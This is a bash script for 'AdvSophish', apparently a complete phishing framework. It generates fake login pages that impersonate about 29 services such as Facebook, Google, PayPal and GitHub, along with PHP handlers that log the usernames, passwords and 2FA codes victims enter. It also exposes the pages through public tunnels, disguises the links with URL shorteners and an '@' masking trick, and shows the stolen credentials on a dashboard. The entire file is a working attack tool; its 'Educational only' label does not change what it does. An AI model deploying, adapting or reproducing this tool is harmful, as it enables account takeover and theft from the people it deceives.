#!/bin/bash

##   AdvSophish - Advanced Phishing Framework (Fully Portable)
##   Author: mahi-cyberaware
##   Version: 3.3.0
##   GitHub: https://github.com/mahi-cyberaware/AdvSophish

trap 'kill_pid; reset_color' INT TERM EXIT

# ------------------------------- Portable Base Dir -------------------------
if command -v realpath &>/dev/null; then
    BASE_DIR=$(realpath "$(dirname "$0")")
else
    BASE_DIR=$(cd "$(dirname "$0")" && pwd)
fi

HOST='127.0.0.1'
PORT='8080'
DASHBOARD_PORT='8081'
SHORTENER="isgd"   # Default: isgd, can be tinyurl, none

# ------------------------------- Safe Colors -------------------------------
if [[ -t 1 ]]; then
    RED='\e[31m'; GREEN='\e[32m'; ORANGE='\e[33m'; BLUE='\e[34m'
    CYAN='\e[36m'; WHITE='\e[37m'; YELLOW='\e[93m'; RESET='\e[0m'
    BOLD='\e[1m'; DIM='\e[2m'
else
    RED=''; GREEN=''; ORANGE=''; BLUE=''; CYAN=''; WHITE=''; YELLOW=''; RESET=''; BOLD=''; DIM=''
fi

reset_color() { printf "%b" "$RESET"; }
if command -v tput &>/dev/null; then
    tput sgr0 2>/dev/null || true
fi

# ------------------------------- Create directories -------------------------
mkdir -p "$BASE_DIR/.server/www" "$BASE_DIR/auth" "$BASE_DIR/dashboard" 2>/dev/null || true

# ------------------------------- Helper Functions --------------------------
kill_pid() {
    for proc in php cloudflared loclx; do
        pkill -f "$proc" 2>/dev/null || true
    done
}

# Clean banner - AdvSophish only
banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "    █████╗ ██████╗ ██╗   ██╗███████╗ ██████╗ ██████╗ ██╗███████╗██╗  ██╗"
    echo "   ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔═══██╗██╔══██╗██║██╔════╝██║  ██║"
    echo "   ███████║██║  ██║██║   ██║███████╗██║   ██║██████╔╝██║███████╗███████║"
    echo "   ██╔══██║██║  ██║╚██╗ ██╔╝╚════██║██║   ██║██╔═══╝ ██║╚════██║██╔══██║"
    echo "   ██║  ██║██████╔╝ ╚████╔╝ ███████║╚██████╔╝██║     ██║███████║██║  ██║"
    echo "   ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${RESET}${DIM}                     Advanced Phishing Framework${RESET}"
    echo -e "${GREEN}${BOLD}                       v3.3.0${RESET}"
    echo -e "${CYAN}                  mahi-cyberaware${RESET}"
    echo
}

# ------------------------------- Dependency Check --------------------------
check_dependencies() {
    echo -e "\n${GREEN}[+]${WHITE} Checking required tools...${RESET}"
    local missing=()
    command -v php &>/dev/null || missing+=("php")
    command -v curl &>/dev/null || missing+=("curl")
    command -v unzip &>/dev/null || missing+=("unzip")
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[-] Missing: ${missing[*]}${RESET}"
        echo -e "${ORANGE}[!] Please install manually:${RESET}"
        echo -e "${YELLOW}    Ubuntu/Debian: sudo apt install php curl unzip${RESET}"
        echo -e "${YELLOW}    Termux: pkg install php curl unzip${RESET}"
        echo -e "${YELLOW}    Arch: sudo pacman -S php curl unzip${RESET}"
        exit 1
    fi
    echo -e "${GREEN}[+] All required tools present.${RESET}"
}

# ------------------------------- Binary Downloaders -----------------------
download_binary() {
    local url="$1" output="$2"
    echo -e "${GREEN}[+] Downloading $output...${RESET}"
    curl -L --silent --insecure --fail --retry 2 -o "$output" "$url" || {
        echo -e "${RED}[-] Failed to download $output${RESET}"
        return 1
    }
    chmod +x "$output"
}

install_cloudflared() {
    [[ -x ".server/cloudflared" ]] && return
    mkdir -p .server
    local arch
    arch=$(uname -m)
    case $arch in
        armv7l|armv8l) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        aarch64)       url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        x86_64)        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        *)             url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
    esac
    download_binary "$url" ".server/cloudflared" || return 1
}

install_localxpose() {
    [[ -x ".server/loclx" ]] && return
    mkdir -p .server
    local arch
    arch=$(uname -m)
    case $arch in
        armv7l|armv8l) url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" ;;
        aarch64)       url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" ;;
        x86_64)        url="https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" ;;
        *)             url="https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" ;;
    esac
    local zipfile=".server/loclx.zip"
    curl -L --silent --insecure --fail --retry 2 -o "$zipfile" "$url" || {
        echo -e "${RED}[-] Failed to download LocalXpose${RESET}"
        return 1
    }
    unzip -qq "$zipfile" -d ".server/"
    mv .server/loclx_* .server/loclx 2>/dev/null || true
    chmod +x ".server/loclx"
    rm -f "$zipfile"
}

# ------------------------------- Site Templates ----------------------------
generate_site() {
    local site_id="$1"
    local name="$2"
    local color="$3"
    local icon="$4"
    local site_dir=".sites/$site_id"
    [[ -d "$site_dir" ]] && return
    mkdir -p "$site_dir"
    
    cat > "$site_dir/style.css" <<-CSS
* { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 20px; text-align: center; }
.logo { font-size: 48px; color: $color; margin-bottom: 20px; }
h2 { color: $color; margin-bottom: 20px; }
input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
button { background: $color; border: none; color: white; font-size: 20px; font-weight: bold; padding: 12px; border-radius: 6px; width: 100%; cursor: pointer; }
.footer { margin-top: 20px; color: #777; font-size: 14px; }
CSS

    cat > "$site_dir/index.html" <<-HTML
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>$name - Sign In</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<link rel="stylesheet" href="style.css">
</head>
<body>
<div class="card"><div class="logo"><i class="$icon"></i></div><h2>Sign in to $name</h2>
<form method="POST" action="login.php"><input type="text" name="username" placeholder="Email or Phone" required autofocus>
<input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form>
<div class="footer">Forgot password? · Create account</div></div>
</body></html>
HTML

    cat > "$site_dir/login.php" <<-PHP
<?php
\$data = "$site_id|" . \$_POST['username'] . "|" . \$_POST['password'] . "|" . date('Y-m-d H:i:s');
file_put_contents('../../auth/usernames.dat', \$data . PHP_EOL, FILE_APPEND);
header('Location: otp.html');
exit;
PHP

    cat > "$site_dir/otp.html" <<-HTML
<!DOCTYPE html>
<html><head><title>2FA Verification</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"><link rel="stylesheet" href="style.css"></head>
<body><div class="card"><div class="logo"><i class="fas fa-shield-alt"></i></div><h2>Two‑Factor Authentication</h2><p>Enter the 6-digit code from your authenticator app.</p>
<form method="POST" action="otp.php"><input type="text" name="otp" placeholder="000000" required maxlength="6"><button type="submit">Verify</button></form></div></body></html>
HTML

    cat > "$site_dir/otp.php" <<-PHP
<?php
\$data = "$site_id|" . \$_POST['otp'] . "|" . date('Y-m-d H:i:s');
file_put_contents('../../auth/otp.dat', \$data . PHP_EOL, FILE_APPEND);
header('Location: https://www.google.com');
exit;
PHP

    cat > "$site_dir/ip.php" <<-PHP
<?php \$ip = \$_SERVER['REMOTE_ADDR'] ?? 'unknown'; file_put_contents('ip.txt', "IP: \$ip - " . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND); ?>
PHP

    echo -e "${GREEN}[✓] Generated $site_id ($name)${RESET}"
}

generate_all_sites() {
    echo -e "${GREEN}[+] Generating all phishing templates...${RESET}"
    while IFS='|' read -r id name color icon; do
        generate_site "$id" "$name" "$color" "$icon"
    done <<-EOF
tiktok|TikTok|#010101|fab fa-tiktok
facebook_tfo|Facebook|#1877f2|fab fa-facebook
instagram_tfo|Instagram|#e4405f|fab fa-instagram
ubereats_tfo|Uber Eats|#06c167|fas fa-utensils
aijo_tfo|Aijo|#ff9900|fas fa-ad
google_tfo|Google|#4285f4|fab fa-google
twitch_tfo|Twitch|#9146ff|fab fa-twitch
netflix_tfo|Netflix|#e50914|fab fa-netflix
instagram_followers|Instagram Followers|#e4405f|fab fa-instagram
amazon_tfo|Amazon|#ff9900|fab fa-amazon
whatsapp_tfo|WhatsApp|#25d366|fab fa-whatsapp
linkedin_tfo|LinkedIn|#0077b5|fab fa-linkedin
hotstar_tfo|Hotstar|#ff5e00|fas fa-tv
spotify_tfo|Spotify|#1db954|fab fa-spotify
github_tfo|GitHub|#333333|fab fa-github
mobikwik_tfo|Mobikwik|#ff6200|fas fa-wallet
zomato_tfo|Zomato|#cb202d|fas fa-utensils
phonepay_tfo|PhonePe|#5f259f|fas fa-phone-alt
paypal_tfo|PayPal|#00457c|fab fa-paypal
telegram_tfo|Telegram|#26a5e4|fab fa-telegram
twitter_tfo|Twitter|#1da1f2|fab fa-twitter
flipcart_tfo|Flipkart|#2874f0|fab fa-opencart
wordpress|WordPress|#21759b|fab fa-wordpress
snapchat_tfo|Snapchat|#fffc00|fab fa-snapchat-ghost
protonmail_tfo|ProtonMail|#6d4aff|fas fa-envelope
stackoverflow|StackOverflow|#f48024|fab fa-stack-overflow
ebay_tfo|eBay|#e53238|fab fa-ebay
pinterest|Pinterest|#bd081c|fab fa-pinterest
cryptocurrency|Crypto Currency|#f2a900|fab fa-bitcoin
EOF
}

# ------------------------------- Phishing Engine --------------------------
setup_site() {
    local site_id="$1"
    generate_all_sites
    rm -rf ".server/www"/* 2>/dev/null || true
    cp -rf ".sites/$site_id"/* ".server/www/"
    cd ".server/www"
    php -S "$HOST":"$PORT" >/dev/null 2>&1 &
    cd "$BASE_DIR"
    echo -e "\n${GREEN}[+] PHP server running on http://$HOST:$PORT${RESET}"
}

capture_data() {
    echo -e "\n${GREEN}[+]${WHITE} Waiting for victim... (Ctrl+C to stop)${RESET}"
    tail -n0 -f "$BASE_DIR/auth/usernames.dat" "$BASE_DIR/auth/otp.dat" 2>/dev/null | while read line; do
        echo -e "${RED}[!]${GREEN} Capture: ${WHITE}$line${RESET}"
    done
}

# URL shortening with user choice
shorten_url() {
    local long_url="$1"
    local short_url=""
    if [[ "$SHORTENER" == "isgd" ]]; then
        short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
        if [[ -z "$short_url" || "$short_url" == *"Error"* ]]; then
            echo -e "${YELLOW}[!] is.gd failed, trying tinyurl...${RESET}"
            short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
        fi
    elif [[ "$SHORTENER" == "tinyurl" ]]; then
        short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
        if [[ -z "$short_url" || "$short_url" == *"Error"* ]]; then
            echo -e "${YELLOW}[!] tinyurl failed, trying is.gd...${RESET}"
            short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
        fi
    else
        short_url="$long_url"
    fi
    [[ -z "$short_url" ]] && short_url="$long_url"
    echo "$short_url"
}

obfuscate_url() {
    local long_url="$1"
    echo -e "\n${GREEN}[+] Original URL: ${CYAN}$long_url${RESET}"
    local short_url=$(shorten_url "$long_url")
    echo -e "${GREEN}[+] Shortened URL: ${CYAN}$short_url${RESET}"
    if [[ -n "$MASK_URL" ]]; then
        local masked="${MASK_URL}@${short_url#https://}"
        echo -e "${GREEN}[+] Masked URL: ${CYAN}$masked${RESET}"
    fi
}

# ------------------------------- Tunnels -----------------------------------
start_cloudflared() {
    local site="$1" port="$2"
    setup_site "$site"
    echo -e "\n${GREEN}[+]${WHITE} Launching Cloudflared...${RESET}"
    ./.server/cloudflared tunnel --url "$HOST:$port" --logfile ".server/.cld.log" >/dev/null 2>&1 &
    sleep 10
    local url
    url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -1)
    if [[ -z "$url" ]]; then
        echo -e "${RED}[-] Cloudflared failed to start. This may be due to network restrictions.${RESET}"
        echo -e "${YELLOW}[!] Try using Localhost (for testing) or LocalXpose.${RESET}"
        exit 1
    fi
    obfuscate_url "$url"
    capture_data
}

start_localxpose() {
    local site="$1" port="$2"
    setup_site "$site"
    echo -e "\n${GREEN}[+]${WHITE} Launching LocalXpose...${RESET}"
    ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST:$port" > ".server/.loclx" 2>&1 &
    sleep 14
    local url
    url=$(grep -o '[0-9a-zA-Z.]*\.loclx.io' ".server/.loclx" | head -1)
    if [[ -z "$url" ]]; then
        echo -e "${RED}[-] LocalXpose failed. Check your token or network.${RESET}"
        exit 1
    fi
    obfuscate_url "https://$url"
    capture_data
}

start_localhost() {
    local site="$1" port="$2"
    setup_site "$site"
    obfuscate_url "http://$HOST:$port"
    capture_data
}

# ------------------------------- Dashboard ----------------------------------
start_dashboard() {
    if [[ ! -f "dashboard/index.php" ]]; then
        mkdir -p dashboard
        cat > "dashboard/index.php" <<-'DASH'
<?php
$creds_file = '../auth/usernames.dat';
$otp_file = '../auth/otp.dat';
$creds = []; $otps = [];
if (file_exists($creds_file)) { $lines = file($creds_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=4) $creds[] = ['site'=>$d[0],'user'=>$d[1],'pass'=>$d[2],'time'=>$d[3]]; } }
if (file_exists($otp_file)) { $lines = file($otp_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=3) $otps[] = ['site'=>$d[0],'otp'=>$d[1],'time'=>$d[2]]; } }
if (isset($_GET['del'])) { if ($_GET['del']=='creds') file_put_contents($creds_file,''); if ($_GET['del']=='otp') file_put_contents($otp_file,''); header('Location: index.php'); exit; }
?><!DOCTYPE html><html><head><title>AdvSophish Dashboard</title><style>body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}h1{color:#ff9800;}table{width:100%;border-collapse:collapse;margin-top:20px;}th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}th{background:#0f1422;}.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}.btn-danger{background:#a12a2a;}</style></head><body><div class=container><h1>AdvSophish Dashboard</h1><div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a></div><h2>Credentials (<?=count($creds)?>)</h2><table><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr><?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?><table><h2>OTPs (<?=count($otps)?>)</h2><table><tr><th>Site</th><th>OTP</th><th>Time</th></tr><?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?></table></div></body></html>
DASH
    fi
    echo -e "\n${GREEN}[+] Starting dashboard on port $DASHBOARD_PORT ...${RESET}"
    cd "dashboard"
    php -S "$HOST":"$DASHBOARD_PORT" >/dev/null 2>&1 &
    cd "$BASE_DIR"
    echo -e "${GREEN}[+] Dashboard URL: ${CYAN}http://$HOST:$DASHBOARD_PORT${RESET}"
    echo -e "${GREEN}[+] Press Ctrl+C to stop dashboard.${RESET}"
    wait
}

# ------------------------------- Menu Options -------------------------------
choose_shortener() {
    echo -e "\n${YELLOW}[?] Choose URL shortening service:${RESET}"
    echo -e "  ${GREEN}[1]${WHITE} is.gd (default)"
    echo -e "  ${GREEN}[2]${WHITE} tinyurl"
    echo -e "  ${GREEN}[3]${WHITE} None (use original URL)"
    read -p "${GREEN}[+] Select: ${WHITE}" opt
    case $opt in
        1) SHORTENER="isgd" ;;
        2) SHORTENER="tinyurl" ;;
        3) SHORTENER="none" ;;
        *) SHORTENER="isgd" ;;
    esac
    echo -e "${GREEN}[+] Shortener set to: $SHORTENER${RESET}"
}

# ------------------------------- Main Menu ----------------------------------
SITE_IDS=(
    tiktok facebook_tfo instagram_tfo ubereats_tfo aijo_tfo google_tfo
    twitch_tfo netflix_tfo instagram_followers amazon_tfo whatsapp_tfo
    linkedin_tfo hotstar_tfo spotify_tfo github_tfo mobikwik_tfo
    zomato_tfo phonepay_tfo paypal_tfo telegram_tfo twitter_tfo
    flipcart_tfo wordpress snapchat_tfo protonmail_tfo stackoverflow
    ebay_tfo pinterest cryptocurrency
)

show_menu() {
    echo -e "\n${WHITE}${BOLD}Available Phishing Targets:${RESET}"
    local i=1
    for id in "${SITE_IDS[@]}"; do
        name=$(echo "$id" | tr '_' ' ' | sed 's/tfo//g' | sed 's/_/ /g' | awk '{for(j=1;j<=NF;j++) $j=toupper(substr($j,1,1)) tolower(substr($j,2))}1')
        printf "${GREEN}[%02d]${CYAN} %-18s" $i "$name"
        if (( i % 3 == 0 )); then echo; fi
        ((i++))
    done
    echo -e "\n${GREEN}[88]${CYAN} Dashboard"
    echo -e "${GREEN}[89]${CYAN} Change URL Shortener (current: $SHORTENER)"
    echo -e "${GREEN}[99]${CYAN} About"
    echo -e "${GREEN}[00]${CYAN} Exit"
}

main_menu() {
    banner
    show_menu
    read -p "${GREEN}[+] Choose option: ${WHITE}" choice
    case $choice in
        00) echo -e "\n${GREEN}Exiting...${RESET}"; kill_pid; exit 0 ;;
        88) start_dashboard; main_menu; return ;;
        89) choose_shortener; main_menu; return ;;
        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.3.0\nLicense: Educational only${RESET}"; read -n1 -p "Press any key..."; main_menu; return ;;
        *)
            if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#SITE_IDS[@]} )); then
                SELECTED_SITE="${SITE_IDS[$((choice-1))]}"
                tunnel_menu
            else
                echo -e "${RED}Invalid option${RESET}"; sleep 1; main_menu
            fi
            ;;
    esac
}

tunnel_menu() {
    echo -e "\n${WHITE}${BOLD}Select Tunneling Method:${RESET}"
    echo -e "  ${GREEN}[1]${CYAN} Localhost (local network only)"
    echo -e "  ${GREEN}[2]${CYAN} Cloudflared (external, may be blocked on some networks)"
    echo -e "  ${GREEN}[3]${CYAN} LocalXpose (external, requires token)"
    read -p "${GREEN}[+] Tunnel: ${WHITE}" tun
    read -p "${GREEN}[+] Custom port? (y/N): ${WHITE}" custom
    local port=$PORT
    if [[ $custom =~ ^[Yy]$ ]]; then
        read -p "Enter port (1024-65535): " port
        if [[ $port -lt 1024 || $port -gt 65535 ]]; then port=8080; fi
    fi
    case $tun in
        1|01) start_localhost "$SELECTED_SITE" "$port" ;;
        2|02) install_cloudflared && start_cloudflared "$SELECTED_SITE" "$port" ;;
        3|03) install_localxpose && start_localxpose "$SELECTED_SITE" "$port" ;;
        *) echo -e "${RED}Invalid${RESET}"; tunnel_menu ;;
    esac
}

# ------------------------------- Start -------------------------------------
kill_pid
check_dependencies
generate_all_sites
main_menu
